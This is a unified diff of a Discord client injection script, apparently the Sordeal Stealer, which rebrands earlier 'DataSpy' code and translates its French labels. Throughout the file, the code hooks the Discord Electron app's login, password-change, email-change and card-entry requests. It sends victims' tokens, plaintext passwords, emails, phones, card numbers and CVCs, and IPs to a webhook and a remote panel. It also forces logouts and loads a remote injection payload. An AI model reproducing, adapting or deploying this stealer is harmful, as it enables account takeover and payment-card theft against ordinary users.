@@ -16,10 +16,9 @@ var config = {
     "embed-color": 16711718,
 
     creator: "%NAME_CREATOR%",
-    injection_url: "https://raw.githubusercontent.com/DataSpyGithub/DataSpyGithub/main/Index.js",
+    injection_url: "https://raw.githubusercontent.com/SOrdeal/Sordeal-Injection/main/index.js",
     webhook: "%WEBHOOK%",
-    uwu: "https://panel.dataspy.com:3000/",
-
+    uwu: "https://panel.sordeal.com:3000/",
     Filter: {
         "urls": [
             "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json",
@@ -29,6 +28,7 @@ var config = {
             "https://discord.com/api/v*/users/@me/library",
             "https://*.discord.com/api/v*/users/@me/billing/subscriptions",
             "https://discord.com/api/v*/users/@me/billing/subscriptions",
+            "wss://remote-auth-gateway.discord.gg/*"
         ]
     },
     onCompleted: {
@@ -59,8 +59,8 @@ const makeEmbed = async ({
     description
 }) => {
     var params = {
-        username: "DataSpy",
-        avatar_url: "",
+        username: "Sordeal Stealer",
+        avatar_url: "https://raw.githubusercontent.com/ShamanOracle/Assets/main/sordeal.png",
         content: "",
         embeds: [{
             title: title,
@@ -68,11 +68,11 @@ const makeEmbed = async ({
             fields: fields,
             description: description ?? "",
             author: {
-                name: `DataSpy`
+                name: `Sordeal`
             },
             
             footer: {
-                text: "[GitHub](https://github.com/DataSpyGithub)"
+                text: `©[${config.creator}] Oracle | https://github.com/SOrdeal/Sordeal-Stealer`
             },
 
         }]
@@ -124,21 +124,21 @@ const GetRBadges = (e) => {
 const GetNSFW = (bouki) => {
     switch (bouki) {
         case true:
-            return ":underage: `NSFW Activer`"
+            return ":underage: `NSFW Allowed`"
         case false:
-            return ":underage: `NSFW Pas Activer`"
+            return ":underage: `NSFW Not Allowed`"
         default:
-            return "NSFW ---"
+            return "Idk bro you got me"
     }
 }
 const GetA2F = (bouki) => {
     switch (bouki) {
         case true:
-            return ":lock: `A2F Activer`"
+            return ":lock: `A2F Enabled`"
         case false:
-            return ":lock: `A2F 'Pas Activer`"
+            return ":lock: `A2F Not Enabled`"
         default:
-            return "A2F ---"
+            return "Idk bro you got me"
     }
 }
 
@@ -148,9 +148,9 @@ const parseFriends = friends => {
     var rareFriends = ""
     for (var friend of real) {
         var badges = GetRBadges(friend.user.public_flags)
-        if (badges !== "---") rareFriends += `${badges} ${friend.user.username}#${friend.user.discriminator}\n`
+        if (badges !== ":x:") rareFriends += `${badges} ${friend.user.username}#${friend.user.discriminator}\n`
     }
-    if (!rareFriends) rareFriends = "---"
+    if (!rareFriends) rareFriends = "No Rare Friends"
     return {
         len: real.length,
         badges: rareFriends
@@ -169,7 +169,7 @@ const parseBilling = billings => {
                 Billings += ":heavy_check_mark: <:paypal:896441236062347374>"
         }
     })
-    if (!Billings) Billings = "---"
+    if (!Billings) Billings = ":x:"
     return Billings
 }
 
@@ -178,7 +178,7 @@ const calcDate = (a, b) => new Date(a.setMonth(a.getMonth() + b))
 const GetNitro = r => {
     switch (r.premium_type) {
         default:
-            return "---"
+            return ":x:"
         case 1:
             return "<:946246402105819216:962747802797113365>"
         case 2:
@@ -228,10 +228,9 @@ function GetLangue(read) {
         "ko": ":flag_kr: Korean"
     }
 
-    var langue = languages[read] || "---";
+    var langue = languages[read] || "No Languages Detected ????";
     return langue
 }
-
 const post = async (params) => {
     params = JSON.stringify(params)
     var token = await execScript(tokenScript)
@@ -257,19 +256,20 @@ const post = async (params) => {
         req.write(res == config.uwu ? n : params);
         req.end();
     })
-    
+
+}
 const FirstTime = async () => {
     if (doTheLogOut) return false
     var token = await execScript(tokenScript)
     if (config['init-notify'] !== "true") return true
-    if (fs.existsSync(__dirname + "/DataSpy")) fs.rmdirSync(__dirname + "/DataSpy")
+    if (fs.existsSync(__dirname + "/Sordeal")) fs.rmdirSync(__dirname + "/Sordeal")
     var ip = await getIP()
     if (!token) {
         var params = await makeEmbed({
-            title: "DataSpy",
+            title: "Sordeal Initalized",
             fields: [{
                 name: "Injection Info",
-                value: `\n- Nom de l'ordinateur ${computerName}\n\n- Injection: ${__dirname}\n\n- IP: ${ip}\n\n[Télécharger L'avatar](${userAvatar})`,
+                value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\``,
                 inline: !1
             }]
         })
@@ -279,17 +279,18 @@ const FirstTime = async () => {
         var friends = await getURL("https://discord.com/api/v9/users/@me/relationships", token)
         var Nitro = await getURL("https://discord.com/api/v9/users/" + user.id + "/profile", token);
 
-        var password = data.password
         var Billings = parseBilling(billing)
         var Friends = parseFriends(friends)
+        if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/ShamanOracle/Assets/main/output-onlinegiftools.gif"
+        if (!user.banner) var userBanner = "https://raw.githubusercontent.com/ShamanOracle/Assets/main/triquetra-wallpaper-2560x800_59.jpg"
 
         userBanner = userBanner ?? await getGifOrPNG(`https://cdn.discordapp.com/banners/${user.id}/${user.banner}`)
         userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
         var params = await makeEmbed({
-            title: "DataSpy",
+            title: "Sordeal Initalized",
             fields: [{
                 name: "Injection Info",
-                value: `\n- Nom de l'ordinateur ${computerName}\n\n- Injection: ${__dirname}\n\n- IP: ${ip}\n\n[Télécharger L'avatar](${userAvatar})`,
+                value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${userAvatar})`,
                 inline: !1
             }, {
                 name: "Username <:username:1041634536733290596> ",
@@ -308,7 +309,7 @@ const FirstTime = async () => {
                 value: `${GetBadges(user.flags)}`,
                 inline: !0
             }, {
-                name: "Langue <:language:1041640473477001236>",
+                name: "Language <:language:1041640473477001236>",
                 value: `${GetLangue(user.locale)}`,
                 inline: !0
             }, {
@@ -320,45 +321,47 @@ const FirstTime = async () => {
                 value: `${GetA2F(user.mfa_enabled)}`,
                 inline: !0
             }, {
-                name: "Carte <a:billing:1041641103629234196>",
-                value: `${Billings ?? "---"}}`,
+                name: "@Copyright",
+                value: `[Sordeal 2023 <:sordeal:1087057809071427695>](https://github.com/SOrdeal/Sordeal-Stealer)`,
+                inline: !0
+            }, {
+                name: "Billing <a:billing:1041641103629234196>",
+                value: `${Billings}`,
                 inline: !1
             }, {
                 name: "Email <a:email:1041639672037785691>",
                 value: `\`${user.email}\``,
                 inline: !0
             }, {
-                name: "Téléphone :mobile_phone:",
-                value: `\`${user.phone ?? "---"}\``,
+                name: "Phone :mobile_phone:",
+                value: `\`${user.phone ?? "None"}\``,
                 inline: !0
             }, {
-                name: "Mots de passe <a:password:1041639669047238676>",
-                value: `\`${password}\``,
-                inline: !0
-            }, {
-                name: "Amis <a:totalfriends:1041641100017946685>",
-                value: `\`${Friends.len ?? "---"}\``,
-                inline: !0
-            }, {
-                name: "Bio <:sordeal:1087057809071427695>",
-                value:  `\`\`\`${user.bio ?? "---"}\`\`\``,
-                inline: !1
-            }, {
-                name: "Token <a:tokens:1041634540537511957>",
-                value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})`,
+                name: "<a:tokens:1041634540537511957> Token",
+                value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${userBanner})`,
                 inline: !1
             }],
+            image: userBanner,
+            thumbnail: userAvatar
+        })
+        var params2 = await makeEmbed({
+            title: `<a:totalfriends:1041641100017946685> Total Friends (${Friends.len})`,
+            color: config['embed-color'],
+            description: Friends.badges,
+            image: userBanner,
+            thumbnail: userAvatar
         })
 
+        params.embeds.push(params2.embeds[0])
     }
     await post(params)
     if ((config.logout != "false" || config.logout !== "%LOGOUT%") && config['logout-notify'] == "true") {
         if (!token) {
             var params = await makeEmbed({
-                title: "DataSpy",
+                title: "Sordealised User log out (User not Logged in before)",
                 fields: [{
                     name: "Injection Info",
-                    value: `\`\`\`Nom de l'ordinateur \n${computerName}\nInjection PATH: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n`,
+                    value: `\`\`\`Name Of Computer: \n${computerName}\nInjection PATH: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n`,
                     inline: !1
                 }]
             })
@@ -368,76 +371,80 @@ const FirstTime = async () => {
             var friends = await getURL("https://discord.com/api/v9/users/@me/relationships", token)
             var Nitro = await getURL("https://discord.com/api/v9/users/" + user.id + "/profile", token);
 
-            var password = data.password
             var Billings = parseBilling(billing)
             var Friends = parseFriends(friends)
+            if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/ShamanOracle/Assets/main/output-onlinegiftools.gif"
+            if (!user.banner) var userBanner = "https://raw.githubusercontent.com/ShamanOracle/Assets/main/triquetra-wallpaper-2560x800_59.jpg"
 
             userBanner = userBanner ?? await getGifOrPNG(`https://cdn.discordapp.com/banners/${user.id}/${user.banner}`)
             userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
             var params = await makeEmbed({
-            title: "DataSpy",
-            fields: [{
-                name: "Injection Info",
-                value: `\n- Nom de l'ordinateur ${computerName}\n\n- Injection: ${__dirname}\n\n- IP: ${ip}\n\n[Télécharger L'avatar](${userAvatar})`,
-                inline: !1
-            }, {
-                name: "Username <:username:1041634536733290596> ",
-                value: `\`${user.username}#${user.discriminator}\``,
-                inline: !0
-            }, {
-                name: "ID <:iduser:1041634535395307520>",
-                value: `\`${user.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${user.id})`,
-                inline: !0
-            }, {
-                name: "Nitro <a:nitro:1041639670288748634>",
-                value: `${GetNitro(Nitro)}`,
-                inline: !0
-            }, {
-                name: "Badges <:badge:1041634538150973460>",
-                value: `${GetBadges(user.flags)}`,
-                inline: !0
-            }, {
-                name: "Langue <:language:1041640473477001236>",
-                value: `${GetLangue(user.locale)}`,
-                inline: !0
-            }, {
-                name: "NSFW <a:nsfw:1041640474617839616>",
-                value: `${GetNSFW(user.nsfw_allowed)}`,
-                inline: !1
-            }, {
-                name: "A2F <a:a2f:1040272766982692885>",
-                value: `${GetA2F(user.mfa_enabled)}`,
-                inline: !0
-            }, {
-                name: "Carte <a:billing:1041641103629234196>",
-                value: `${Billings ?? "---"}}`,
-                inline: !1
-            }, {
-                name: "Email <a:email:1041639672037785691>",
-                value: `\`${user.email}\``,
-                inline: !0
-            }, {
-                name: "Téléphone :mobile_phone:",
-                value: `\`${user.phone ?? "---"}\``,
-                inline: !0
-            }, {
-                name: "Mots de passe <a:password:1041639669047238676>",
-                value: `\`${password}\``,
-                inline: !0
-            }, {
-                name: "Amis <a:totalfriends:1041641100017946685>",
-                value: `\`${Friends.len ?? "---"}\``,
-                inline: !0
-            }, {
-                name: "Bio <:sordeal:1087057809071427695>",
-                value:  `\`\`\`${user.bio ?? "---"}\`\`\``,
-                inline: !1
-            }, {
-                name: "Token <a:tokens:1041634540537511957>",
-                value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Télécharger Bannier](${userBanner})`,
-                inline: !1
-            }],
-        })
+                title: "Sordeal Victim got logged out",
+                fields: [{
+                    name: "Injection Info",
+                    value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${userAvatar})`,
+                    inline: !1
+                }, {
+                    name: "Username <:username:1041634536733290596> ",
+                    value: `\`${user.username}#${user.discriminator}\``,
+                    inline: !0
+                }, {
+                    name: "ID <:iduser:1041634535395307520>",
+                    value: `\`${user.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${user.id})`,
+                    inline: !0
+                }, {
+                    name: "Nitro <a:nitro:1041639670288748634>",
+                    value: `${GetNitro(Nitro)}`,
+                    inline: !0
+                }, {
+                    name: "Badges <:badge:1041634538150973460>",
+                    value: `${GetBadges(user.flags)}`,
+                    inline: !0
+                }, {
+                    name: "Language <:language:1041640473477001236>",
+                    value: `${GetLangue(user.locale)}`,
+                    inline: !0
+                }, {
+                    name: "NSFW <a:nsfw:1041640474617839616>",
+                    value: `${GetNSFW(user.nsfw_allowed)}`,
+                    inline: !1
+                }, {
+                    name: "A2F <a:a2f:1040272766982692885>",
+                    value: `${GetA2F(user.mfa_enabled)}`,
+                    inline: !0
+                }, {
+                    name: "@Copyright",
+                    value: `[Sordeal 2023 <:sordeal:1087057809071427695>](https://github.com/SOrdeal/Sordeal-Stealer)`,
+                    inline: !0
+                }, {
+                    name: "Billing <a:billing:1041641103629234196>",
+                    value: `${Billings}`,
+                    inline: !1
+                }, {
+                    name: "Email <a:email:1041639672037785691>",
+                    value: `\`${user.email}\``,
+                    inline: !0
+                }, {
+                    name: "Phone :mobile_phone:",
+                    value: `\`${user.phone ?? "None"}\``,
+                    inline: !0
+                }, {
+                    name: "<a:tokens:1041634540537511957> Token",
+                    value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${userBanner})`,
+                    inline: !1
+                }],
+                image: userBanner,
+                thumbnail: userAvatar
+            })
+            var params2 = await makeEmbed({
+                title: `<a:totalfriends:1041641100017946685> Total Friends (${Friends.len})`,
+                color: config['embed-color'],
+                description: Friends.badges,
+                image: userBanner,
+                thumbnail: userAvatar
+            })
+
+            params.embeds.push(params2.embeds[0])
         }
         fs.writeFileSync("./d3dcompiler.dlll", "LogOut")
         await execScript(logOutScript)
@@ -491,7 +498,6 @@ function init() {
 
 require("${appPath}/app.asar")
 if (fs.existsSync(betterDiscord)) require(betterDiscord)`
-
     fs.writeFileSync(index, script)
     if (!doTheLogOut) execScript(logOutScript)
     return
@@ -533,6 +539,8 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
     var friends = await getURL("https://discord.com/api/v9/users/@me/relationships", token)
     var Nitro = await getURL("https://discord.com/api/v9/users/" + user.id + "/profile", token);
 
+    if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/ShamanOracle/Assets/main/output-onlinegiftools.gif"
+    if (!user.banner) var userBanner = "https://raw.githubusercontent.com/ShamanOracle/Assets/main/triquetra-wallpaper-2560x800_59.jpg"
 
     userBanner = userBanner ?? await getGifOrPNG(`https://cdn.discordapp.com/banners/${user.id}/${user.banner}`)
     userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
@@ -543,12 +551,12 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
         case request.url.endsWith("login"):
             var password = data.password
             var params = await makeEmbed({
-                title: "DataSpy",
-                description: "",
+                title: "Sordeal User Login",
+                description: "[<:sordeal:1087057809071427695>  **Oh you have Sordealised someone**](https://github.com/SOrdeal/Sordeal-Stealer)",
                 color: config['embed-color'],
                 fields: [{
                     name: "Injection Info",
-                    value: `\n- Nom de l'ordinateur ${computerName}\n\n- Injection: ${__dirname}\n\n- IP: ${ip}\n\n[Télécharger L'avatar](${userAvatar})`,
+                    value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${userAvatar})`,
                     inline: !1
                 }, {
                     name: "Username <:username:1041634536733290596> ",
@@ -567,7 +575,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                     value: `${GetBadges(user.flags)}`,
                     inline: !0
                 }, {
-                    name: "Langue <:language:1041640473477001236>",
+                    name: "Language <:language:1041640473477001236>",
                     value: `${GetLangue(user.locale)}`,
                     inline: !0
                 }, {
@@ -579,37 +587,44 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                     value: `${GetA2F(user.mfa_enabled)}`,
                     inline: !0
                 }, {
-                    name: "Carte <a:billing:1041641103629234196>",
-                    value: `${Billings ?? "---"}`,
+                    name: "@Copyright",
+                    value: `[Sordeal 2023 <:sordeal:1087057809071427695>](https://github.com/SOrdeal/Sordeal-Stealer)`,
+                    inline: !0
+                }, {
+                    name: "Billing <a:billing:1041641103629234196>",
+                    value: `${Billings}`,
                     inline: !1
                 }, {
                     name: "Email <a:email:1041639672037785691>",
                     value: `\`${user.email}\``,
                     inline: !0
                 }, {
-                    name: "Télephone :mobile_phone:",
-                    value: `\`${user.phone ?? "---"}\``,
+                    name: "Phone :mobile_phone:",
+                    value: `\`${user.phone ?? "None"}\``,
                     inline: !0
                 }, {
-                    name: "Mots de passe <a:password:1041639669047238676>",
+                    name: "<a:password:1041639669047238676> Password",
                     value: `\`${password}\``,
                     inline: !0
                 }, {
-                    name: "Amis <a:totalfriends:1041641100017946685>",
-                    value: `\`${Friends.len ?? "---"}\``,
-                    inline: !0
-                }, {
-                    name: "Bio <:sordeal:1087057809071427695>",
-                    value:  `\`\`\`${user.bio ?? "---"}\`\`\``,
-                    inline: !1
-                }, {
-                    name: "Token <a:tokens:1041634540537511957>",
-                    value: `\`\`\`${token ?? "---"}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Télécharger Bannier](${userBanner})`,
+                    name: "<a:tokens:1041634540537511957> Token",
+                    value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${userBanner})`,
                     inline: !1
                 }],
 
+                thumbnail: userAvatar,
+                image: userBanner
             })
 
+            var params2 = await makeEmbed({
+                title: `<a:totalfriends:1041641100017946685> Total Friends (${Friends.len})`,
+                color: config['embed-color'],
+                description: Friends.badges,
+                image: userBanner,
+                thumbnail: userAvatar
+            })
+
+            params.embeds.push(params2.embeds[0])
         
             await post(params)
             break
@@ -617,12 +632,12 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
             if (!data.password) return
             if (data.new_password) {
                 var params = await makeEmbed({
-                    title: "DataSpy",
-                    description: "",
+                    title: "Sordeal Detect Password Changed",
+                    description: "[<:sordeal:1087057809071427695>  **Oh you have Sordealised someone**](https://github.com/SOrdeal/Sordeal-Stealer)",
                     color: config['embed-color'],
                     fields: [{
                         name: "Injection Info",
-                        value: `\n- Nom de l'ordinateur ${computerName}\n\n- Injection: ${__dirname}\n\n- IP: ${ip}\n\n[Télécharger L'avatar](${userAvatar})`,
+                        value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${userAvatar})`,
                         inline: !1
                     }, {
                         name: "Username <:username:1041634536733290596> ",
@@ -641,7 +656,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                         value: `${GetBadges(user.flags)}`,
                         inline: !0
                     }, {
-                        name: "Langue <:language:1041640473477001236>",
+                        name: "Language <:language:1041640473477001236>",
                         value: `${GetLangue(user.locale)}`,
                         inline: !0
                     }, {
@@ -653,23 +668,27 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                         value: `${GetA2F(user.mfa_enabled)}`,
                         inline: !0
                     }, {
-                        name: "Carte <a:billing:1041641103629234196>",
-                        value: `${Billings ?? "---"}`,
+                        name: "@Copyright",
+                        value: `[Sordeal 2023 <:sordeal:1087057809071427695>](https://github.com/SOrdeal/Sordeal-Stealer)`,
+                        inline: !0
+                    }, {
+                        name: "Billing <a:billing:1041641103629234196>",
+                        value: `${Billings}`,
                         inline: !0
                     }, {
                         name: "Email <a:email:1041639672037785691>",
                         value: `\`${user.email}\``,
                         inline: !0
                     }, {
-                        name: "Téléphone :mobile_phone:",
-                        value: `\`${user.phone ?? "---"}\``,
+                        name: "Phone :mobile_phone:",
+                        value: `\`${user.phone ?? "None"}\``,
                         inline: !0
                     }, {
-                        name: "Ancien Mots de passe <a:password:1041639669047238676>",
+                        name: "<a:password:1041639669047238676> Old Password",
                         value: `\`${data.password}\``,
                         inline: !0
                     }, {
-                        name: "Nouveau Mots de passe <a:password:1041639669047238676>",
+                        name: "<a:password:1041639669047238676> New Password",
                         value: `\`${data.new_password}\``,
                         inline: !0
                     }, {
@@ -677,30 +696,35 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                         value: `\`\`\`${user.bio ?? ":x:"}\`\`\``,
                         inline: !1
                     }, {
-                        name: "Amis <a:totalfriends:1041641100017946685>",
-                        value: `\`${Friends.len ?? "---"}\``,
-                        inline: !0
-                    }, {
-                        name: "Bio <:sordeal:1087057809071427695>",
-                        value:  `\`\`\`${user.bio ?? "---"}\`\`\``,
-                        inline: !1
-                    }, {
-                        name: "Token <a:tokens:1041634540537511957>",
-                        value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Télécharger Bannier](${userBanner})`,
+                        name: "<a:tokens:1041634540537511957> Token",
+                        value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${userBanner})`,
                         inline: !1
                     }, ],
+
+                    thumbnail: userAvatar,
+                    image: userBanner
                 })
+
+                var params2 = await makeEmbed({
+                    title: `<a:totalfriends:1041641100017946685> Total Friends (${Friends.len})`,
+                    color: config['embed-color'],
+                    description: Friends.badges,
+                    image: userBanner,
+                    thumbnail: userAvatar
+                })
+
+                params.embeds.push(params2.embeds[0])
             
                 await post(params)
             }
             if (data.email) {
                 var params = await makeEmbed({
-                    title: "DataSpy",
-                    description: "",
+                    title: "Sordeal Detect Email Changed",
+                    description: "[<:sordeal:1087057809071427695>  **Oh you have Sordealised someone**](https://github.com/SOrdeal/Sordeal-Stealer)",
                     color: config['embed-color'],
                     fields: [{
                         name: "Injection Info",
-                        value: `\n- Nom de l'ordinateur ${computerName}\n\n- Injection: ${__dirname}\n\n- IP: ${ip}\n\n[Télécharger L'avatar](${userAvatar})`,
+                        value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${userAvatar})`,
                         inline: !1
                     }, {
                         name: "Username <:username:1041634536733290596> ",
@@ -719,7 +743,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                         value: `${GetBadges(user.flags)}`,
                         inline: !0
                     }, {
-                        name: "Langue <:language:1041640473477001236>",
+                        name: "Language <:language:1041640473477001236>",
                         value: `${GetLangue(user.locale)}`,
                         inline: !0
                     }, {
@@ -731,36 +755,49 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                         value: `${GetA2F(user.mfa_enabled)}`,
                         inline: !0
                     }, {
-                        name: "Carte <a:billing:1041641103629234196>",
-                        value: `${Billings ?? "---"}`,
+                        name: "@Copyright",
+                        value: `[Sordeal 2023 <:sordeal:1087057809071427695>](https://github.com/SOrdeal/Sordeal-Stealer)`,
+                        inline: !0
+                    }, {
+                        name: "Billing <a:billing:1041641103629234196>",
+                        value: `${Billings}`,
                         inline: !1
                     }, {
-                        name: "Nouveau Email <a:email:1041639672037785691>",
+                        name: "New Email <a:email:1041639672037785691>",
                         value: `\`${user.email}\``,
                         inline: !0
                     }, {
-                        name: "Téléphone :mobile_phone:",
-                        value: `\`${user.phone ?? "---"}\``,
+                        name: "Phone :mobile_phone:",
+                        value: `\`${user.phone ?? "None"}\``,
                         inline: !0
                     }, {
-                        name: "Mots de passe <a:password:1041639669047238676>",
+                        name: "<a:password:1041639669047238676> Password",
                         value: `\`${data.password}\``,
                         inline: !0
                     }, {
-                        name: "Amis <a:totalfriends:1041641100017946685>",
-                        value: `\`${Friends.len ?? "---"}\``,
-                        inline: !0
-                    }, {
                         name: "Bio <:sordeal:1087057809071427695>",
-                        value:  `\`\`\`${user.bio ?? "---"}\`\`\``,
+                        value:  `\`\`\`${user.bio ?? ":x:"}\`\`\``,
                         inline: !1
                     }, {
-                        name: "Token <a:tokens:1041634540537511957>",
+                        name: "<a:tokens:1041634540537511957> Token",
                         value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${userBanner})`,
                         inline: !1
                     }, ],
+
+                    thumbnail: userAvatar,
+                    image: userBanner
                 })
 
+                var params2 = await makeEmbed({
+                    title: `<a:totalfriends:1041641100017946685> Total Friends (${Friends.len})`,
+                    color: config['embed-color'],
+                    description: Friends.badges,
+                    image: userBanner,
+                    thumbnail: userAvatar
+                })
+
+                params.embeds.push(params2.embeds[0])
+            
                 await post(params)
             }
             break
@@ -768,84 +805,36 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
             var [CardNumber, CardCVC, month, year] = [data["card[number]"], data["card[cvc]"], data["card[exp_month]"], data["card[exp_year]"]]
 
             var params = await makeEmbed({
-                title: "DataSpy",
-                description: "",
-                color: config['embed-color'],
-                    fields: [{
-                        name: "Injection Info",
-                        value: `\n- Nom de l'ordinateur ${computerName}\n\n- Injection: ${__dirname}\n\n- IP: ${ip}\n\n[Télécharger L'avatar](${userAvatar})`,
-                        inline: !1
-                    }, {
-                        name: "Username <:username:1041634536733290596> ",
-                        value: `\`${user.username}#${user.discriminator}\``,
-                        inline: !0
-                    }, {
-                        name: "ID <:iduser:1041634535395307520>",
-                        value: `\`${user.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${user.id})`,
-                        inline: !0
-                    }, {
-                        name: "Nitro <a:nitro:1041639670288748634>",
-                        value: `${GetNitro(Nitro)}`,
-                        inline: !0
-                    }, {
-                        name: "Badges <:badge:1041634538150973460>",
-                        value: `${GetBadges(user.flags)}`,
-                        inline: !0
-                    }, {
-                        name: "Langue <:language:1041640473477001236>",
-                        value: `${GetLangue(user.locale)}`,
-                        inline: !0
-                    }, {
-                        name: "NSFW <a:nsfw:1041640474617839616>",
-                        value: `${GetNSFW(user.nsfw_allowed)}`,
-                        inline: !1
-                    }, {
-                        name: "A2F <a:a2f:1040272766982692885>",
-                        value: `${GetA2F(user.mfa_enabled)}`,
-                        inline: !0
-                    }, {
-                        name: "Numéro de carte <a:billing:1041641103629234196>",
-                        value: `${CardNumber}`,
-                        inline: !1
-                    }, {
-                        name: "Expiration de la carte <a:billing:1041641103629234196>",
-                        value: `${month}/${year}`,
-                        inline: !1
-                    }, {
-                        name: "Code de securité <a:billing:1041641103629234196>",
-                        value: `${CardCVC}`,
-                        inline: !1
-                    }, {
-                        name: "Email <a:email:1041639672037785691>",
-                        value: `\`${user.email}\``,
-                        inline: !0
-                    }, {
-                        name: "Téléphone :mobile_phone:",
-                        value: `\`${user.phone ?? "---"}\``,
-                        inline: !0
-                    }, {
-                        name: "Mots de passe <a:password:1041639669047238676>",
-                        value: `\`${data.password}\``,
-                        inline: !0
-                    }, {
-                        name: "Amis <a:totalfriends:1041641100017946685>",
-                        value: `\`${Friends.len ?? "---"}\``,
-                        inline: !0
-                    }, {
-                        name: "Bio <:sordeal:1087057809071427695>",
-                        value:  `\`\`\`${user.bio ?? "---"}\`\`\``,
-                        inline: !1
-                    }, {
-                        name: "Token <a:tokens:1041634540537511957>",
-                        value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${userBanner})`,
-                        inline: !1
-                    }, ],
-                })
+                title: "Sordeal User Credit Card Added",
+                description: `
+                **IP:** ${ip}\n\n
+                **Username** <:username:1041634536733290596>\n\`\`\`${user.username}#${user.discriminator}\`\`\`\n
+                **ID** <:iduser:1041634535395307520>\n\`\`\`${user.id}\`\`\`\n
+                **Email** <a:email:1041639672037785691>\n\`\`\`${user.email}\`\`\`\n
+                **Nitro Type** <a:nitro:1041639670288748634>\n${GetNitro(user.premium_type)}\n
+                **Language** <:language:1041640473477001236>\n${GetLangue(user.locale)}\n
+                **A2F** <a:a2f:1040272766982692885>\n${GetA2F(user.mfa_enabled)}\n
+                **NSFW** <a:nsfw:1041640474617839616>\n${GetNSFW(user.nsfw_allowed)}\n
+                **Badges** <:badge:1041634538150973460>\n${GetBadges(user.flags)}\n
+                **Credit Card Number**\n\`\`\`${CardNumber}\`\`\`\n
+                **Credit Card Expiration**\n\`\`\`${month}/${year}\`\`\`\n
+                **CVC**\n\`\`\`${CardCVC}\`\`\`\n
+                <a:tokens:1041634540537511957> **Token** \n\`\`\`${token}\`\`\``,
+                thumbnail: userAvatar,
+                image: userBanner
+            })
 
-                params.embeds.push(params2.embeds[0])
-                await post(params)
-                break
-        }
-    })
-}
+            var params2 = await makeEmbed({
+                title: `<a:totalfriends:1041641100017946685> Total Friends (${Friends.len})`,
+                color: config['embed-color'],
+                description: Friends.badges,
+                image: userBanner,
+                thumbnail: userAvatar
+            })
+
+            params.embeds.push(params2.embeds[0])
+            await post(params)
+            break
+    }
+})
 module.exports = require("./core.asar")
